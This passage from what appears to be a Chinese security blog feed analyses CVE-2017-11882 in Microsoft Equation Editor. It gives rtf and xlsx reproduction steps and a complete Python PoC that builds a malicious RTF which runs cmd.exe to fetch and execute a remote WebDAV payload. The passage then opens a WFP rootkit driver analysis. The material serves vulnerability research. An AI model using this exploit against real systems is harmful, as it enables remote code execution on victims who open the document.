href="http://example.com/filename.hta">http://example.com/filename.hta</a></li><li>rtf文档中内嵌一个PE，打开时会释放到temp目录下，用WinExec来运行</li></ul><p><strong>另一种利用方法</strong></p><p>是将shellcode放在rtf文件公式编辑器对象的Data数据中，公式编辑器会给这段shellcode数据开辟一块堆地址，然后会将对地址放到一个固定的指针中。利用这一特性，就可以将返回地址使用执行ret指令的地址覆盖，当函数执行到返回便会跳转到ret指令处执行ret指令，此时ret的指令便会跳转到栈顶也就是函数调用时参数的地址（存储的是要拷贝的字符串）所在的栈中去执行。然后在栈中执行拷贝的字符串，便会从固定地方的指针取出存放shellcode的堆地址，跳转过去执行shellcode。这种方式执行的shellcode可以很长，功能也更加全面。</p><h3 id="漏洞产生的必要条件"><a href="#漏洞产生的必要条件" class="headerlink" title="漏洞产生的必要条件"></a><strong>漏洞产生的必要条件</strong></h3><p>从前面的分析中，大家也不难看出<strong>EQNEDT32.EXE</strong>这个程序并没有开启ASLR（地址随机化），这为其将返回地址修改为固定地址<code>430C12</code>（Call WinExec）提供可能，并且改程序也没有开启DEP（数据执行保护），也为其能在栈中执行<code>shellcode</code>提供可能（笔者所演示的POC没有涉及执行Shellcode，大家可自行尝试覆盖返回地址到栈中执行shellcode操作），通过 PEStudio 查看<strong>EQNEDT32.EXE</strong>的 <code>ASLR</code>和 <code>DEP</code>的状态，如图7：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200317120029595.png" alt="image-20200317120029595"></p><h4 id="自动触发条件"><a href="#自动触发条件" class="headerlink" title="自动触发条件"></a><strong>自动触发条件</strong></h4><p>该漏洞针对Word和Execl文件都是可以适用的，不过目前经研究其中只有.rtf文件和.xlsx文件可以自动触发该漏洞。doc、docx、xls目前没有发现可以自动触发的相关属性。</p><p>.rtf和.xlsx文档之所以可以自动触发该漏洞原因分别为：</p><p><strong>.rtf通过设置objupdate属性</strong></p><p>该属性是在显示对象之前更新oleObject对象，从而在打开文档时便会自动调用公式编辑器，从而触发漏洞。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200531163920050.png" alt="image-20200531163920050"></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200531163956304.png" alt="image-20200531163956304"></p><p><strong>.xlsx通过设置autoload属性</strong></p><p>在<code>\xl\worksheets</code>目录下的<code>sheeet1.xml</code>可设置自动加载 <strong>oleObject</strong> 对象属性，只需要将<code>autoLoad</code>的值置为1，就可以在打开 Excel 表的同时自动加载公式编辑器对象，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200406172548551.png" alt="image-20200406172548551"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h2><p>手动构造POC，实现将文档中的PE文件释放到临时目录下去，并运行该文件。这里以.doc为例，进行复现：</p><p><strong>效果图：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.gif" alt="漏洞复现"></p><h3 id="rtf漏洞复现"><a href="#rtf漏洞复现" class="headerlink" title="rtf漏洞复现"></a><strong>rtf漏洞复现</strong></h3><p>1.先新建docx文档，并在文档中插入公式编辑器对象，这里选择（4*4）的矩阵模型（原则上大于0xC5就可，用于存放payload），其中的数值可随意填写，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200531174921994.png" alt="image-20200531174921994"></p><p>2.插入一个package对象，文件选择PE文件，这里选择笔者临时写的一个弹窗程序，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200531180249627.png" alt="image-20200531180249627"></p><p>3.使用解压缩软件打开docx文件，将\word\embeddings\oleObject2.bin取出来用offvis找到Equation Native Stream Data的偏移和大小，在010中将其payload替换掉，如图：</p><p>替换后</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200531180340288.png" alt="image-20200531180340288"></p><p>4.前面也说明了，只用xlsx和rtf通过设置相应的属性来实现加载oleObject，并且只有rtf文档会自动在temp目录下释放文件。将文件另存为rtf，并将扩展名改为doc（实际还是rtf文档，word可以正常处理）。</p><p>5.在用记事本打开rtf文档，查找object字符串，在第一次匹配到的地方添加<code>objupdate</code>属性，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200531181451887.png" alt="image-20200531181451887"></p><p>利用成功，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200531181556892.png" alt="image-20200531181556892"></p><h3 id="xlsx漏洞复现"><a href="#xlsx漏洞复现" class="headerlink" title="xlsx漏洞复现"></a><strong>xlsx漏洞复现</strong></h3><p>1.新建xlsx文档，并在文档中插入公式编辑器对象，这里选择（4*4）的矩阵模型（原则上大于0xC5就可，用于存放payload），其中的数值可随意填写，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200531165939456.png" alt="image-20200531165939456"></p><p>2.使用解压缩软件打开xlsx文件，将\xl\embeddings\oleObject1.bin取出来用offvis找到Equation Native Stream Data的偏移和大小，在010中将其payload替换掉，如图：</p><p><strong>替换后</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200531182955312.png" alt="image-20200531182955312"></p><p>3.再使用解压缩软件打开xlsx文件，往\xl\worksheets\sheet1.xml文件中添加autoLoad属性并将其设置为1，如图:</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200531183537866.png" alt="image-20200531183537866"></p><p>利用成功，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/03_%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/01_CVE-2017-11882/image-20200531182906464.png" alt="image-20200531182906464"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a><strong>POC</strong></h2><p>网上有很多POC，这里列出来其中一个：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RTF_HEADER = R<span class="string">&quot;&quot;&quot;&#123;\rtf1\ansi\ansicpg1252\deff0\nouicompat\deflang1033&#123;\fonttbl&#123;\f0\fnil\fcharset0 Calibri;&#125;&#125;</span></span><br><span class="line"><span class="string">&#123;\*\generator Riched20 6.3.9600&#125;\viewkind4\uc1</span></span><br><span class="line"><span class="string">\pard\sa200\sl276\slmult1\f0\fs22\lang9&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">RTF_TRAILER = R<span class="string">&quot;&quot;&quot;\par&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">OBJECT_HEADER = R<span class="string">&quot;&quot;&quot;&#123;\object\objemb\objupdate&#123;\*\objclass Equation.3&#125;\objw380\objh260&#123;\*\objdata &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">OBJECT_TRAILER = R<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#125;&#123;\result&#123;\pict&#123;\*\picprop&#125;\wmetafile8\picw380\pich260\picwgoal380\pichgoal260</span></span><br><span class="line"><span class="string">0100090000039e00000002001c0000000000050000000902000000000500000002010100000005</span></span><br><span class="line"><span class="string">0000000102ffffff00050000002e0118000000050000000b0200000000050000000c02a0016002</span></span><br><span class="line"><span class="string">1200000026060f001a00ffffffff000010000000c0ffffffc6ffffff20020000660100000b0000</span></span><br><span class="line"><span class="string">0026060f000c004d61746854797065000020001c000000fb0280fe000000000000900100000000</span></span><br><span class="line"><span class="string">0402001054696d6573204e657720526f6d616e00feffffff5f2d0a6500000a0000000000040000</span></span><br><span class="line"><span class="string">002d01000009000000320a6001100003000000313131000a00000026060f000a00ffffffff0100</span></span><br><span class="line"><span class="string">000000001c000000fb021000070000000000bc02000000000102022253797374656d000048008a</span></span><br><span class="line"><span class="string">0100000a000600000048008a01ffffffff6ce21800040000002d01010004000000f00100000300</span></span><br><span class="line"><span class="string">00000000</span></span><br><span class="line"><span class="string">&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">OBJDATA_TEMPLATE = R<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1</span></span><br><span class="line"><span class="string">b11ae1000000000000000000000000000000003e000300feff090006000000000000000000000001</span></span><br><span class="line"><span class="string">0000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">fffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffe</span></span><br><span class="line"><span class="string">fffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e0074007200790000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000</span></span><br><span class="line"><span class="string">000000000000008020cea5613cd30103000000000200000000000001004f006c0065000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000a000201ffffffffffffffffffffffff00000000000000000000000000</span></span><br><span class="line"><span class="string">0000000000000000000000000000000000000000000000000000001400000000000000010043006f</span></span><br><span class="line"><span class="string">006d0070004f0062006a000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000120002010100000003000000ffffffff0000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000010000006600000000</span></span><br><span class="line"><span class="string">00000003004f0062006a0049006e0066006f00000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000012000201ffffffff04000000ff</span></span><br><span class="line"><span class="string">ffffff00000000000000000000000000000000000000000000000000000000000000000000000003</span></span><br><span class="line"><span class="string">0000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000fe</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffff01000002080000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">0000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02</span></span><br><span class="line"><span class="string">ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e</span></span><br><span class="line"><span class="string">30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000030004</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">000000000000000000000000000000000000001c00000002009ec4a900000000000000c8a75c00c4</span></span><br><span class="line"><span class="string">ee5b0000000000030101030a0a01085a5a4141414141414141414141414141414141414141414141</span></span><br><span class="line"><span class="string">414141414141414141414141414141414141414141120c4300000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000004500710075</span></span><br><span class="line"><span class="string">006100740069006f006e0020004e0061007400690076006500000000000000000000000000000000</span></span><br><span class="line"><span class="string">0000000000000000000000000000000000000020000200ffffffffffffffffffffffff0000000000</span></span><br><span class="line"><span class="string">0000000000000000000000000000000000000000000000000000000000000004000000c500000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000ffffffffffffffffff</span></span><br><span class="line"><span class="string">ffffff00000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">000000000000000000000000000000000000000000000000000000000000000000000000000000ff</span></span><br><span class="line"><span class="string">ffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000ffffffffffffffffffffffff000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">00000000000000000000000000000000000000000000000000000001050000050000000d0000004d</span></span><br><span class="line"><span class="string">45544146494c4550494354003421000035feffff9201000008003421cb010000010009000003c500</span></span><br><span class="line"><span class="string">000002001c00000000000500000009020000000005000000020101000000050000000102ffffff00</span></span><br><span class="line"><span class="string">050000002e0118000000050000000b0200000000050000000c02a001201e1200000026060f001a00</span></span><br><span class="line"><span class="string">ffffffff000010000000c0ffffffc6ffffffe01d0000660100000b00000026060f000c004d617468</span></span><br><span class="line"><span class="string">54797065000020001c000000fb0280fe0000000000009001000000000402001054696d6573204e65</span></span><br><span class="line"><span class="string">7720526f6d616e00feffffff6b2c0a0700000a0000000000040000002d0100000c000000320a6001</span></span><br><span class="line"><span class="string">90160a000000313131313131313131310c000000320a6001100f0a00000031313131313131313131</span></span><br><span class="line"><span class="string">0c000000320a600190070a000000313131313131313131310c000000320a600110000a0000003131</span></span><br><span class="line"><span class="string">31313131313131310a00000026060f000a00ffffffff0100000000001c000000fb02100007000000</span></span><br><span class="line"><span class="string">0000bc02000000000102022253797374656d000048008a0100000a000600000048008a01ffffffff</span></span><br><span class="line"><span class="string">7cef1800040000002d01010004000000f0010000030000000000</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">COMMAND_OFFSET = <span class="number">0x949</span>*<span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_ole_exec_primitive</span>(<span class="params">command</span>):</span></span><br><span class="line">    <span class="keyword">if</span> len(command) &gt; <span class="number">43</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;primitive command must be shorter than 43 bytes&quot;</span>)</span><br><span class="line">    hex_command = command.encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">    objdata_hex_stream = OBJDATA_TEMPLATE.translate(<span class="literal">None</span>, <span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">    ole_data = objdata_hex_stream[:COMMAND_OFFSET] + hex_command + objdata_hex_stream[COMMAND_OFFSET + len(hex_command):]</span><br><span class="line">    <span class="keyword">return</span> OBJECT_HEADER + ole_data + OBJECT_TRAILER</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_rtf</span>(<span class="params">header, trailer, remote_location, remote_file</span>):</span></span><br><span class="line">    ole1 = create_ole_exec_primitive(<span class="string">&quot;cmd.exe /c start &quot;</span> + remote_location + <span class="string">&quot; &amp;&quot;</span>)</span><br><span class="line">    ole2 = create_ole_exec_primitive(remote_file + <span class="string">&quot; &amp;&quot;</span>)</span><br><span class="line">    <span class="comment"># We need 2 or more commands for executing remote file from WebDAV</span></span><br><span class="line">    <span class="comment"># because WebClient service start may take some time</span></span><br><span class="line">    <span class="keyword">return</span> header + ole1 + ole2 + ole2 + ole2 + trailer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;PoC for CVE-2017-11882&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, help=<span class="string">&quot;Remote location to trigger WebClient service&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-e&quot;</span>, <span class="string">&quot;--executable&quot;</span>, help=<span class="string">&quot;Remote executable in WebDAV path&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&quot;--output&quot;</span>, help=<span class="string">&quot;Output exploit rtf&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    rtf_content = create_rtf(RTF_HEADER, RTF_TRAILER, args.url, args.executable)</span><br><span class="line"></span><br><span class="line">    output_file = open(args.output, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    output_file.write(rtf_content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;!!! Completed !!!&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WFP网络过滤驱动分析报告</title>
      <link href="2020/04/01/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/14_WFP%E7%BD%91%E7%BB%9C%E8%BF%87%E6%BB%A4%E9%A9%B1%E5%8A%A8%E5%88%86%E6%9E%90/"/>
      <url>2020/04/01/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/14_WFP%E7%BD%91%E7%BB%9C%E8%BF%87%E6%BB%A4%E9%A9%B1%E5%8A%A8%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<center><font size =8><b>WFP网络过滤驱动分析报告</b></font></center><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><table><thead><tr><th align="center">样本名称</th><th align="center"><strong>qsafd_vw_1_10_0_20.sys</strong></th></tr></thead><tbody><tr><td align="center"><strong>样本类型</strong></td><td align="center"><strong>Rootkit</strong></td></tr><tr><td align="center"><strong>样本大小</strong></td><td align="center"><strong>56.38 KB (57728 bytes)</strong></td></tr><tr><td align="center"><strong>MD5</strong></td><td align="center"><strong>D615E94389B927888FDCDE7D2F36BF4C</strong></td></tr></tbody></table><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>该Rootkit样本是一个基于WFP框架的网络过滤驱动，在特定的网络分层中设置过滤器，对特定网络数据进行过滤。</p></blockquote><h1 id="样本详细分析"><a href="#样本详细分析" class="headerlink" title="样本详细分析"></a>样本详细分析</h1><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p><strong>初始化派遣函数</strong></p><p>通过<code>memcpy</code>设置驱动的派遣函数，将所有的派遣函数都设置为<code>subMajorFunction_140004748</code>，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/14_WFP%E7%BD%91%E7%BB%9C%E8%BF%87%E6%BB%A4%E9%A9%B1%E5%8A%A8%E5%88%86%E6%9E%90/image-20200703201424104.png" alt="image-20200703201424104"></p><p>函数<code>subMajorFunction_140004748</code>根据接受到IRP请求，进行相应的操作，由于缺少R3程序，这里便没有详细分析具体的派遣函数操作。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/14_WFP%E7%BD%91%E7%BB%9C%E8%BF%87%E6%BB%A4%E9%A9%B1%E5%8A%A8%E5%88%86%E6%9E%90/image-20200703201833804.png" alt="image-20200703201833804"></p><p><strong>初始化设备对象和设备符号链接</strong></p><p>创建名为\Device\CtrlSM的设备对象，创建名为\DosDevicse\CtrlSM的设备符号链接，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/14_WFP%E7%BD%91%E7%BB%9C%E8%BF%87%E6%BB%A4%E9%A9%B1%E5%8A%A8%E5%88%86%E6%9E%90/image-20200703202257655.png" alt="image-20200703202257655"></p><p><strong>初始化卸载函数</strong></p><p>卸载函数释放自旋锁，设备对象和符号链接，释放分配的内存池等，如图：</p><p><img 